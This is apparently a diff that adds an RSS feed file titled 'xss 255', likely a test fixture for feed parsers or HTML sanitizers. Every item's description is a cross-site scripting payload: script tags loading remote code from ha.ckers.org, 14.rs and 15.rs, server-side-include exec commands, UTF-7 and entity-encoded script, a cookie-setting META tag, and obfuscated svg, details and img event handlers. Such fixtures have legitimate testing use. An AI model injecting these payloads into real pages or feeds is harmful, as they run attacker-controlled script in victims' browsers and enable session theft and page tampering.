@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 255</title>
+  <link>https://www.VBPOCOMJKMMNQUUQQOLH.com</link>
+  <description>SIIJFWCYAKKNCKWPHDAO</description>
+  <item>
+    <title>QCLKIMWHXCBDHNRLEKLI</title>
+    <link>http://wwww.VWMLJLSEYCOZODLWSAYRZBGKPNBFVQFZWXJHGSOO.com</link>
+    <description>
+      <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+    </description>
+  </item>
+  <item>
+    <title>DSDGOLIGGWLYXBVGXDFK</title>
+    <link>http://wwww.OCLPNBOEBQYBXYMHNKPGWFOWHEABANEAJMVLMQDW.com</link>
+    <description>
+      <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+    </description>
+  </item>
+  <item>
+    <title>UVJIRDGXXAMGKQTMNTVX</title>
+    <link>http://wwww.IWXQNNTSCHSQMRIMJSCGVHIMCJBUEBHPJSAYWQGR.com</link>
+    <description>
+      <? echo('<SCR)';
+    </description>
+  </item>
+  <item>
+    <title>CGYSRZIPYGFPCWVQGCPH</title>
+    <link>http://wwww.WSTKBVCGVAKETXGAKNHGEHJFVGJIQITGYSSDBNWA.com</link>
+    <description>
+      <META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+    </description>
+  </item>
+  <item>
+    <title>TAYAIFPTACPEIHRSALBH</title>
+    <link>http://wwww.BKMRDUMPMJEEQYHIBRWYXLMYAIQGLITJRFQYGIYF.com</link>
+    <description>
+      <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+    </description>
+  </item>
+  <item>
+    <title>IEFVGDWWENMIOLXRNPNM</title>
+    <link>http://wwww.PQGEBEFOYZPWGLXCUEZZMBGJSAJSDJKIKJMIXWED.com</link>
+    <description>
+      <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    </description>
+  </item>
+  <item>
+    <title>AAOTIBMLYALCRUDZHPYR</title>
+    <link>http://wwww.KXYDKQHTIFGCOBQYXBPLUJXAREKXUFSMWVJBLYBW.com</link>
+    <description>
+      <SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    </description>
+  </item>
+  <item>
+    <title>TSTIOMVDWTFGQNOFISNA</title>
+    <link>http://wwww.DSUNSTDAADGBBQHAKMINVMTRJTKSDZQKSQWSYFJK.com</link>
+    <description>
+      <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    </description>
+  </item>
+  <item>
+    <title>KUHPQAFXVFCKVGQBEDBA</title>
+    <link>http://wwww.DDMYYQANFIUPWSKQNAXFAMPOLLNZRSADMJMXKDCU.com</link>
+    <description>
+      <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    </description>
+  </item>
+  <item>
+    <title>SWWQZEEHOGJJLAYPFIUK</title>
+    <link>http://wwww.MMWNNMWKMDQCQPOJNUJHSCCHJGPSPOZNBGUVFSBB.com</link>
+    <description>
+      <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    </description>
+  </item>
+  <item>
+    <title>PREJZMBQRONGJJGMMLNW</title>
+    <link>http://wwww.BKDGVTMMIITJBRCHZRTIAEFLZVJEDDAVGPLJZGFC.com</link>
+    <description>
+      <svg%0Aonload=%09((pro\u006dpt))()//
+    </description>
+  </item>
+  <item>
+    <title>BTIJWWGYORXDZTNNJBQB</title>
+    <link>http://wwww.QMWVLUTQURYJGOUOZRRAEBFDLLNHCOQNNLOGTNKU.com</link>
+    <description>
+      <sCriPt x>(((confirm)))``</scRipt x>
+    </description>
+  </item>
+  <item>
+    <title>SMJFJGRMQAQZMZWRZPVH</title>
+    <link>http://wwww.BLKOIHPLREIBILFVKFTKUHXDLBSKNVEEGEFVUBTZ.com</link>
+    <description>
+      <w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+    </description>
+  </item>
+  <item>
+    <title>ECHBINCBFOVAHLBABJXU</title>
+    <link>http://wwww.OYEACZHACOSPPNEZOOAJHESTGAIHQWTIOFKGUCYQ.com</link>
+    <description>
+      <deTAiLs/open/oNtoGGle=confirm()>
+    </description>
+  </item>
+  <item>
+    <title>OOORUZQIAIUCPAEKKJTI</title>
+    <link>http://wwww.ZSJTCAQKIWBNDWHKCNBFRBQIHNIMNIAJBAGISAJV.com</link>
+    <description>
+      <scRiPt y="><">/*<sCRipt* */prompt()</script
+    </description>
+  </item>
+  <item>
+    <title>EOEIIDFDQXHPTNZBUAPU</title>
+    <link>http://wwww.RFAYEAAKKCJENULMWVBAVUJVZDQADBCFRCMLTLAV.com</link>
+    <description>
+      <A href="javascript%26colon;confirm()">click
+    </description>
+  </item>
+  <item>
+    <title>EONPBMVATKNESVTLAJVU</title>
+    <link>http://wwww.IFTQMUZWUIUEVISTSWUJZEPHDTUOZLNCBVVROVCK.com</link>
+    <description>
+      <sVg oNloaD=write()>
+    </description>
+  </item>
+  <item>
+    <title>BJYVUYDGGWJHFBLCUBII</title>
+    <link>http://wwww.YWVNQMTDFNDVMXLDQIMKFQFBRBSRQEQLNXIHMEGU.com</link>
+    <description>
+      <A href=javas%26#99;ript:alert(1)>click
+    </description>
+  </item>
+  <item>
+    <title>UYVKGWZZTNYPCYTURHLS</title>
+    <link>http://wwww.UZKSATCOFPIGFMZCGPMPHLPBUJMFDCVEZPPTVXBN.com</link>
+    <description>
+      <sCrIpt/"<a"/srC=data:=".<a,[8].some(confirm)>
+    </description>
+  </item>
+  <item>
+    <title>QSDBNXSIYBYFRGKZOJKK</title>
+    <link>http://wwww.NWZMOEKJKUZGXUNITWISXHLABDGCQXREICAVNCOS.com</link>
+    <description>
+      <svG/x=">"/oNloaD=confirm()//
+    </description>
+  </item>
+  <item>
+    <title>RZCOCMXQDYQHONUHXWHV</title>
+    <link>http://wwww.XEHMNEBKFHXPFQHOHSAWATDYQCEKGYFVPAMKXYVC.com</link>
+    <description>
+      <--`<iMG/srC=` onerror=confirm``> --!>
+    </description>
+  </item>
+  <item>
+    <title>TBPRMASISNPXRUFIAGIK</title>
+    <link>http://wwww.WPAOYNFFECWCUFLSJORXVARAETDWCMEFECAEGVWC.com</link>
+    <description>
+      <SVg </onlOad ="1> (_=prompt,_(1)) "">
+    </description>
+  </item>
+  <item>
+    <title>OKMFUWDGJILCXMMXRCZA</title>
+    <link>http://wwww.HWBWQNNBETVRHYFSUJGWRGKZNJEPPKMJNYRFDYHW.com</link>
+    <description>
+      <!--><scRipT src=//14.rs>
+    </description>
+  </item>
+  <item>
+    <title>IFQCYLLZGTOPGNKIOGDB</title>
+    <link>http://wwww.DTRRYOLQOEMQDFCQGLPXMLUPSNFMVSMZNOBZSHKA.com</link>
+    <description>
+      <sCriPt/src=//14.rs?
+    </description>
+  </item>
+  <item>
+    <title>YRXLXDTUWJAPHSKUCWOI</title>
+    <link>http://wwww.JHRUTQOBZUGKJKUOJGLPOFPGEVNXAMTGFRDHWZML.com</link>
+    <description>
+      <sCRIpt x=">" src=//15.rs></script>
+    </description>
+  </item>
+</channel>
+</rss>
